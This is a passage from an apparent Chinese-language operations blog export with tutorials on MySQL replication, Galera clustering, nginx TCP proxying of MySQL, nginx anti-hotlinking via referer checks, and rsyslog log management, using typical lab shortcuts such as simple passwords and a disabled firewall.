class="line">[root@mysql-server1 ~]# systemctl enable mysqld</span><br><span class="line">修改密码：</span><br><span class="line">略。。。</span><br></pre></td></tr></table></figure><p>配置主从</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 两台均配置，注意不一样的地方</span></span><br><span class="line">[root@mysql-server1 ~]# vim /etc/my.cnf # 在[mysqld]添加</span><br><span class="line">log-bin=mysql-bin #开启二进制日志</span><br><span class="line">log-bin-index=binlog.index</span><br><span class="line">server-id=1 #设置server-id</span><br><span class="line"><span class="meta">#</span><span class="bash"> auto_increment_increment=2  <span class="comment"># 自增减步长</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> auto_increment_offset=2     <span class="comment"># 自增减开始</span></span></span><br><span class="line">[root@mysql-server1 ~]# systemctl restart mysqld</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入数据库，创建replication账户</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> CREATE USER <span class="string">&#x27;repl&#x27;</span>@<span class="string">&#x27;192.168.10.12&#x27;</span> IDENTIFIED BY <span class="string">&#x27;123456&#x27;</span>;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> GRANT REPLICATION SLAVE ON *.* TO <span class="string">&#x27;repl&#x27;</span>@<span class="string">&#x27;192.168.10.12&#x27;</span>;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> flush privileges;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 记录master 状态</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show master status\G</span></span><br><span class="line">            File: mysql-bin.000002</span><br><span class="line">        Position: 567</span><br><span class="line">    Binlog_Do_DB: </span><br><span class="line">Binlog_Ignore_DB: </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置从库</span></span><br><span class="line">CHANGE MASTER TO MASTER_HOST=&#x27;192.168.10.12&#x27;,</span><br><span class="line">MASTER_USER=&#x27;repl&#x27;,</span><br><span class="line">MASTER_PASSWORD=&#x27;123456&#x27;,</span><br><span class="line">MASTER_LOG_FILE=&#x27;mysql-bin.000002&#x27;,</span><br><span class="line">MASTER_LOG_POS=567;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 两服务器均配置成功后</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> start slave;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show slave status\G</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200202153142577.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 存储 </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql-galera集群部署</title>
      <link href="2020/12/04/mysql%E4%B9%8Bgalera%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/"/>
      <url>2020/12/04/mysql%E4%B9%8Bgalera%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h3 id="Galera-Cluster-介绍"><a href="#Galera-Cluster-介绍" class="headerlink" title="Galera Cluster 介绍"></a>Galera Cluster 介绍</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Galera是一个MySQL(也支持MariaDB，Percona)的同步多主集群软件。</span><br><span class="line"></span><br><span class="line">主要功能</span><br><span class="line">同步复制</span><br><span class="line">Active-active的多主拓扑结构</span><br><span class="line">真正的multi-master，即所有节点可以同时读写数据库</span><br><span class="line">自动成员资格控制，失败节点从群集中删除</span><br><span class="line">新节点加入数据自动复制</span><br><span class="line">真正的并行复制，行级</span><br></pre></td></tr></table></figure><h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">centos 7.5 4台</span><br><span class="line">mysql-wsrep 5.7</span><br></pre></td></tr></table></figure><h3 id="集群部署"><a href="#集群部署" class="headerlink" title="集群部署"></a>集群部署</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">准备环境：</span><br><span class="line">主机解析：</span><br><span class="line">[root@admin ~]# cat /etc/hosts</span><br><span class="line">127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1 localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.245.133 galera1</span><br><span class="line">192.168.245.136 galera2</span><br><span class="line">192.168.245.10 galera3</span><br><span class="line">192.168.245.135 galera4</span><br><span class="line"></span><br><span class="line">关闭防火墙和selinux:</span><br><span class="line">setenforce 0 &amp;&amp; systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">时间同步：</span><br><span class="line">修改时区：</span><br><span class="line"><span class="meta">#</span><span class="bash"> ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> timedatectl set-timezone Asia/Shanghai</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">下载和安装Galera（每台都需要安装）</span><br><span class="line">注意：Galera有独立的补丁包，也有在mysql基础上打好补丁的完整包</span><br><span class="line">我们要下载带wsrep扩展补丁的版本，比如：</span><br><span class="line">MySQL 5.7.20 extended with wsrep patch version 25.13</span><br><span class="line"></span><br><span class="line">所以：删除原版本mysql，步骤不够详细，详细的之前有讲过:</span><br><span class="line">[root@wing yum.repos.d]# yum erase `rpm -qa | grep mysql` -y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">根据官方下载提示找到下载路径，发现下载路径下是已经做好yum源的路径，所以可以直接修改yum配置文件使用yum安装</span><br><span class="line"></span><br><span class="line">配置yum源：</span><br><span class="line">[root@wing yum.repos.d]# cat galera.repo</span><br><span class="line">[galera]</span><br><span class="line">name=galera</span><br><span class="line">baseurl=http://releases.galeracluster.com/mysql-wsrep-5.7/centos/7/x86_64/</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line"></span><br><span class="line">[root@wing yum.repos.d]# yum list | grep &#x27;galera&#x27;</span><br><span class="line">galera.x86_64 25.3.12-2.el7 epel</span><br><span class="line">mysql-wsrep-5.7.x86_64 5.7.20-25.13.el7 galera</span><br><span class="line">mysql-wsrep-client-5.7.x86_64 5.7.20-25.13.el7 galera</span><br><span class="line">mysql-wsrep-common-5.7.x86_64 5.7.20-25.13.el7 galera</span><br><span class="line">mysql-wsrep-devel-5.7.x86_64 5.7.20-25.13.el7 galera</span><br><span class="line">mysql-wsrep-libs-5.7.x86_64 5.7.20-25.13.el7 galera</span><br><span class="line">mysql-wsrep-libs-compat-5.7.x86_64 5.7.20-25.13.el7 galera</span><br><span class="line">mysql-wsrep-server-5.7.x86_64 5.7.20-25.13.el7 galera</span><br><span class="line">注意：需要epel源提供galera包</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果是yum源安装：</span></span><br><span class="line">[root@wing yum.repos.d]# yum install mysql-wsrep-5.7.x86_64 galera rsync -y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果是本地安装，注意安装顺序</span></span><br><span class="line">yum install -y \</span><br><span class="line">mysql-wsrep-libs-compat-5.7-5.7.29-25.21.el7.x86_64.rpm \</span><br><span class="line">mysql-wsrep-common-5.7-5.7.29-25.21.el7.x86_64.rpm \</span><br><span class="line">mysql-wsrep-libs-5.7-5.7.29-25.21.el7.x86_64.rpm \</span><br><span class="line">mysql-wsrep-client-5.7-5.7.29-25.21.el7.x86_64.rpm \</span><br><span class="line">mysql-wsrep-server-5.7-5.7.29-25.21.el7.x86_64.rpm \</span><br><span class="line">mysql-wsrep-devel-5.7-5.7.29-25.21.el7.x86_64.rpm \</span><br><span class="line">galera-25.3.12-2.el7.x86_64.rpm \</span><br><span class="line">boost-program-options-1.53.0-27.el7.x86_64.rpm \</span><br><span class="line">nmap-ncat-6.40-19.el7.x86_64.rpm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">特别注意：</span><br><span class="line">1.timezone,ceph和rsync</span><br><span class="line">2./var/lib/mysql下3个文件：grastate.dat gvwstate.dat galera.cache 如果出了错，把他们统统干掉</span><br><span class="line">3.如果一起添到集群中不行就一个节点一个节点的添加</span><br><span class="line"></span><br><span class="line">修改密码：</span><br><span class="line">[root@galera1 ~]# mysql_pass=`grep &#x27;password is generated&#x27; /var/log/mysqld.log |awk &#x27;&#123;print $NF&#125;&#x27; |awk &#x27;END&#123;print&#125;&#x27;` &amp;&amp; echo $mysql_pass</span><br><span class="line">[root@galera1 ~]# mysqladmin -u root -p$&#123;mysql_pass&#125; password &#x27;Qianfeng123!&#x27;</span><br><span class="line">[root@galera1 ~]# mysql -u root -p&#x27;Qianfeng123!&#x27;</span><br><span class="line"></span><br><span class="line">每台机器创建用于数据同步的用户:</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> grant all on *.* to <span class="string">&#x27;syncuser&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified by <span class="string">&#x27;QianFeng@123&#x27;</span>;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> flush privileges;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">配置Galera Replication:</span><br><span class="line">galera1配置：主配置文件my.cnf追加如下内容</span><br><span class="line">server-id=1</span><br><span class="line">binlog_format=row</span><br><span class="line">innodb_file_per_table=1</span><br><span class="line">innodb_autoinc_lock_mode=2</span><br><span class="line"></span><br><span class="line">wsrep_on=ON</span><br><span class="line">wsrep_provider=/usr/lib64/galera/libgalera_smm.so</span><br><span class="line">wsrep_cluster_name=&#x27;galera&#x27;</span><br><span class="line">wsrep_cluster_address=&#x27;gcomm://&#x27;</span><br><span class="line">wsrep_node_name=&#x27;galera1&#x27;</span><br><span class="line">wsrep_node_address=&#x27;192.168.245.133&#x27;</span><br><span class="line">wsrep_sst_auth=syncuser:&#x27;QianFeng@123&#x27;</span><br><span class="line">wsrep_sst_method=rsync</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">galera2配置：主配置文件my.cnf追加如下内容</span><br><span class="line">server-id=2</span><br><span class="line">binlog_format=row</span><br><span class="line">innodb_file_per_table=1</span><br><span class="line">innodb_autoinc_lock_mode=2</span><br><span class="line"></span><br><span class="line">wsrep_on=ON</span><br><span class="line">wsrep_provider=/usr/lib64/galera/libgalera_smm.so</span><br><span class="line">wsrep_cluster_name=&#x27;galera&#x27;</span><br><span class="line">wsrep_cluster_address=&#x27;gcomm://galera1,galera3,galera4&#x27;</span><br><span class="line">wsrep_node_name=&#x27;galera2&#x27;</span><br><span class="line">wsrep_node_address=&#x27;192.168.245.136&#x27;</span><br><span class="line">wsrep_sst_auth=syncuser:&#x27;QianFeng@123&#x27;</span><br><span class="line">wsrep_sst_method=rsync</span><br><span class="line"></span><br><span class="line">galera3配置：主配置文件my.cnf追加如下内容</span><br><span class="line">server-id=3</span><br><span class="line">binlog_format=row</span><br><span class="line">innodb_file_per_table=1</span><br><span class="line">innodb_autoinc_lock_mode=2</span><br><span class="line"></span><br><span class="line">wsrep_on=ON</span><br><span class="line">wsrep_provider=/usr/lib64/galera/libgalera_smm.so</span><br><span class="line">wsrep_cluster_name=&#x27;galera&#x27;</span><br><span class="line">wsrep_cluster_address=&#x27;gcomm://galera1,galera2,galera4&#x27;</span><br><span class="line">wsrep_node_name=&#x27;galera3&#x27;</span><br><span class="line">wsrep_node_address=&#x27;192.168.245.10&#x27;</span><br><span class="line">wsrep_sst_auth=syncuser:&#x27;QianFeng@123&#x27;</span><br><span class="line">wsrep_sst_method=rsync</span><br><span class="line"></span><br><span class="line">galera4配置：主配置文件my.cnf追加如下内容</span><br><span class="line">server-id=4</span><br><span class="line">binlog_format=row</span><br><span class="line">innodb_file_per_table=1</span><br><span class="line">innodb_autoinc_lock_mode=2</span><br><span class="line"></span><br><span class="line">wsrep_on=ON</span><br><span class="line">wsrep_provider=/usr/lib64/galera/libgalera_smm.so</span><br><span class="line">wsrep_cluster_name=&#x27;galera&#x27;</span><br><span class="line">wsrep_cluster_address=&#x27;gcomm://galera1,galera2,galera3&#x27;</span><br><span class="line">wsrep_node_name=&#x27;galera4&#x27;</span><br><span class="line">wsrep_node_address=&#x27;192.168.245.135&#x27;</span><br><span class="line">wsrep_sst_auth=syncuser:&#x27;QianFeng@123&#x27;</span><br><span class="line">wsrep_sst_method=rsync</span><br><span class="line"></span><br><span class="line">重启服务：每台机器</span><br><span class="line">[root@galera1 ~]# systemctl restart mysqld</span><br><span class="line"></span><br><span class="line">查看端口：galera端口4567 mysql端口3306</span><br><span class="line">[root@galera1 ~]# ss -auntpl | grep -E &#x27;3306|4567&#x27;</span><br><span class="line">tcp LISTEN 0 128 *:4567 *:* users:((&quot;mysqld&quot;,pid=11068,fd=12))</span><br><span class="line">tcp LISTEN 0 80 :::3306 :::* users:((&quot;mysqld&quot;,pid=11068,fd=39))</span><br><span class="line"></span><br><span class="line">测试：</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show status like <span class="string">&#x27;wsrep%&#x27;</span>;</span></span><br><span class="line">wsrep_incoming_addresses | 192.168.245.136:3306,192.168.245.135:3306,192.168.245.10:3306 |</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>阶段测试:<br>在任何一台机器上写数据，在其他机器上全部会同步</p>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> 存储 </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 数据库 </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于nginx四层负载均衡（tcp）代理mysql集群</title>
      <link href="2020/12/04/nginx_4%E5%B1%82%E4%BB%A3%E7%90%86mysql%E6%9C%8D%E5%8A%A1/"/>
      <url>2020/12/04/nginx_4%E5%B1%82%E4%BB%A3%E7%90%86mysql%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="基于nginx四层负载均衡（tcp）代理mysql集群"><a href="#基于nginx四层负载均衡（tcp）代理mysql集群" class="headerlink" title="基于nginx四层负载均衡（tcp）代理mysql集群"></a>基于nginx四层负载均衡（tcp）代理mysql集群</h3><ul><li>nginx 1.9版本之前只支持7层负载，之后版本stream支持4层tcp负载</li><li>本次实验后端为galera集群，实验中未列出集群部署方式</li><li>by newrain</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装nginx所需依赖</span></span><br><span class="line">yum -y install gcc-c++ pcre pcre-devel zlib zlib-devel openssl openssl-devel</span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载nginx 源码包</span></span><br><span class="line">wget http://nginx.org/download/nginx-1.9.9.tar.gz</span><br><span class="line">tar -zxvf nginx-1.9.9.tar.gz # 解压源码包</span><br><span class="line"><span class="meta">#</span><span class="bash"> 编译安装nginx</span></span><br><span class="line">./configure --prefix=/usr/local/nginx --with-http_ssl_module   --with-strea</span><br><span class="line">m  </span><br><span class="line">make -j 2 &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">编辑/usr/local/nginx/conf/nginx.conf,在最后一行添加如下</span><br><span class="line">stream &#123;</span><br><span class="line">    server &#123;</span><br><span class="line">       listen 3305;</span><br><span class="line">       proxy_pass db;    </span><br><span class="line">    &#125;</span><br><span class="line">    upstream db &#123;</span><br><span class="line">       server 10.3.131.22:3306;</span><br><span class="line">       server 10.3.131.23:3306;</span><br><span class="line">       server 10.3.131.24:3306;</span><br><span class="line">       server 10.3.131.25:3306;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置完成后启动nginx</span></span><br><span class="line">/usr/local/nginx/bin/nginx</span><br><span class="line"><span class="meta">#</span><span class="bash"> 测试登录</span></span><br><span class="line">mysql -uroot -p&#x27;QianFeng@123&#x27; -h 10.3.131.21 -P 3305</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx 防盗链详解</title>
      <link href="2020/12/04/nginx_%E9%98%B2%E7%9B%97%E9%93%BE%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/12/04/nginx_%E9%98%B2%E7%9B%97%E9%93%BE%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="nginx防盗链"><a href="#nginx防盗链" class="headerlink" title="nginx防盗链"></a>nginx防盗链</h1><blockquote><pre><code>  在实际生产过程中，我们线上的图片等静态资源，经常会被其他网站盗用，他们发大财的同时，成本确实我们在买单，下面来说下，如何杜绝这种行为。</code></pre></blockquote><p>nginx防盗链模块</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ngx_http_referer_module</span><br></pre></td></tr></table></figure><p><strong>如何区分哪些是不正常的用户？</strong><br>        HTTP Referer是Header的一部分，当浏览器向Web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器借此可以获得一些信息用于处理，例如防止未经允许的网站盗链图片、文件等。因此HTTP Referer头信息是可以通过程序来伪装生成的，所以通过Referer信息防盗链并非100%可靠，但是，它能够限制大部分的盗链情况.<br>        比如在<a href="http://www.google.com/">www.google.com</a> 里有一个<code>www.baidu.com</code> 链接，那么点击这个<code>www.baidu.com</code> ，它的<code>header</code> 信息里就有：Referer=<a href="http://www.google.com/">http://www.google.com</a></p><p>防盗链配置(例)</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/nginx/nginx.conf</span></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~  .*\.(gif|jpg|png|jpeg)$</span> &#123;</span><br><span class="line">         <span class="attribute">root</span>  /usr/share/nginx/html;</span><br><span class="line"></span><br><span class="line">         <span class="attribute">valid_referers</span>  newrain.wang <span class="number">10.10.10.10</span>;</span><br><span class="line">                <span class="attribute">if</span> ($invalid_referer) &#123;</span><br><span class="line">                   <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>valid_referers 设置访问白名单</li><li>none : 允许没有http_refer的请求访问资源；</li><li>blocked : 允许不是http://开头的，不带协议的请求访问资源；</li><li>server_names : 只允许指定ip/域名来的请求访问资源（白名单）；</li></ul><p>防盗链实例<br>两台nginx 服务器<br>nginx1</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> vim /etc/nginx/conf.d/nginx.conf</span></span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">         root   /usr/local/nginx/html;</span><br><span class="line">         index  index.html index.htm;</span><br><span class="line">         valid_referers none blocked 192.168.0.227 121.36.59.58 *.qf.com;</span><br><span class="line">                if ($invalid_referer) &#123;</span><br><span class="line">                         rewrite ^/ https://ss0.bdstatic.com/94oJfD_bAAcT8t7mm9GUKT-xh_/timg?image&amp;quality=100&amp;size=b4000_4000&amp;sec=1591516652&amp;di=d50907c9c37b1d33ebb3ba43a9c6de9c&amp;src=http://a2.att.hudong.com/36/48/19300001357258133412489354717.jpg;</span><br><span class="line">                         #return 403;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    location ~  .*\.(gif|jpg|png|jpeg)$ &#123;</span><br><span class="line">         root  /usr/local/nginx/html;</span><br><span class="line"></span><br><span class="line">         valid_referers 192.168.0.227 121.36.59.58 *.qf.com;</span><br><span class="line">                if ($invalid_referer) &#123;</span><br><span class="line">                         rewrite ^/ https://ss0.bdstatic.com/94oJfD_bAAcT8t7mm9GUKT-xh_/timg?image&amp;quality=100&amp;size=b4000_4000&amp;sec=1591516652&amp;di=d50907c9c37b1d33ebb3ba43a9c6de9c&amp;src=http://a2.att.hudong.com/36/48/19300001357258133412489354717.jpg;</span><br><span class="line">         #return 403;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># vim /usr/local/nginx/html/index.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>qf.com<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;background-color:red;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./a.jpg&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>nginx2</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>qf.com<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;background-color:red;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://121.36.59.58/a.jpg&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>nginx2 curl 测试 </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> curl http://121.36.59.58</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;qf.com&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body style=&quot;background-color:red;&quot;&gt;</span><br><span class="line">    &lt;img src=&quot;./a.jpg&quot;/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> curl -e http://www.baidu.com http://121.36.59.58</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx/1.16.0&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> curl -e http://121.36.59.58 http://121.36.59.58</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;qf.com&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body style=&quot;background-color:red;&quot;&gt;</span><br><span class="line">    &lt;img src=&quot;./a.jpg&quot;/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>浏览器测试<br><img src="https://img-blog.csdnimg.cn/20200607155607506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200607160020880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是我们发现，直接访问我们的网站是可以的，访问盗链网站就会被rewrite到一个特殊的图片。<br>由上面的实验我们得到结论</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">valid_referers 后面可以指定的参数</span><br><span class="line">1 none  说的通俗一点就是允许资源可以直接通过浏览器访问，不加则返回 $invalid_referer 的内容</span><br><span class="line">2 blocked 指的是可以允许不通过http协议的访问，也就是说，如果我们curl -e &#x27;&#x27; http://121.36.59.58 是可以访问的 ，curl -e &#x27;www.baidu.com&#x27; http://121.36.59.58 也是可以的，但是 curl -e &#x27;http:www.baidu.com&#x27; http://121.36.59.58 就不可以了，因为我们在配置文件中允许了http头信息中可以带有不是http开头的访问。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 系统日志服务</title>
      <link href="2020/12/04/rsyslog_%E7%AE%A1%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
      <url>2020/12/04/rsyslog_%E7%AE%A1%E7%90%86%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h4 id="一：日志的重要性"><a href="#一：日志的重要性" class="headerlink" title="一：日志的重要性"></a>一：日志的重要性</h4><p>日志分类：系统日志，进程日志，应用程序日志 </p><p>记录日志的用处： 排错，追溯事件，统计流量，审计安全行为 </p><p>rsyslogd：只负责绝大部分日志记录，和系统操作有关，安全，认证，计划任务… </p><p>处理分析日志：</p><p>1.少量日志使用vim cat tail grep awk这些文档处理程序查看和检索                        </p><p>2.大量日志可以用splunk、elk  </p><p>日志存放位置:  存放本地 /var/log    </p><p>日志服务启动:systemctl start rsyslog </p><p>日志配置文件:/etc/rsyslog.conf </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@newrain ~]# ps aux |grep rsyslogd |grep -v grep root       </span><br><span class="line"></span><br><span class="line">686  0.0  0.0 219752  8436 ?        Ssl  16:35   0:00 /usr/sbin/rsyslogd -n </span><br></pre></td></tr></table></figure><h4 id="二：rsyslog日志管理"><a href="#二：rsyslog日志管理" class="headerlink" title="二：rsyslog日志管理"></a>二：rsyslog日志管理</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">常见的日志文件(系统、进程、应用程序)</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls /var/<span class="built_in">log</span>/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> tail /var/<span class="built_in">log</span>/messages      //系统主日志文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> tail -f /var/<span class="built_in">log</span>/messages      //动态查看日志文件的尾部</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> tail -f /var/<span class="built_in">log</span>/secure            //认证、安全</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> tail /var/<span class="built_in">log</span>/cron            //crond、at进程产生的日志</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> tail /var/<span class="built_in">log</span>/yum.log                   //yum</span></span><br><span class="line"></span><br><span class="line">二进制日志：</span><br><span class="line"><span class="meta">#</span><span class="bash"> w                             //当前登录的用户即: /var/<span class="built_in">log</span>/wtmp日志</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> last                            //最近登录的用户 /var/<span class="built_in">log</span>/btmp</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> lastlog                        //所有用户的登录情况 /var/<span class="built_in">log</span>/lastlog</span></span><br><span class="line"></span><br><span class="line">进程以自己的方式去记录日志</span><br><span class="line"><span class="meta">#</span><span class="bash"> tail /var/<span class="built_in">log</span>/mysqld.log               //MySQL进程自己记录的日志</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> tail /var/<span class="built_in">log</span>/httpd/access_log         //Apache自己记录的日志</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> tail /var/<span class="built_in">log</span>/xferlog                  //和访问FTP服务器相关</span></span><br><span class="line"></span><br><span class="line">案例1: 统计登录失败top 2 </span><br><span class="line"><span class="meta">#</span><span class="bash"> grep <span class="string">&#x27;Fail&#x27;</span> /var/<span class="built_in">log</span>/secure |awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> |sort |uniq -c|sort -n -r |head -2</span></span><br><span class="line">    366 140.205.225.186</span><br><span class="line">    335 140.205.201.44</span><br><span class="line"></span><br><span class="line">案例2: 统计登录成功 </span><br><span class="line"><span 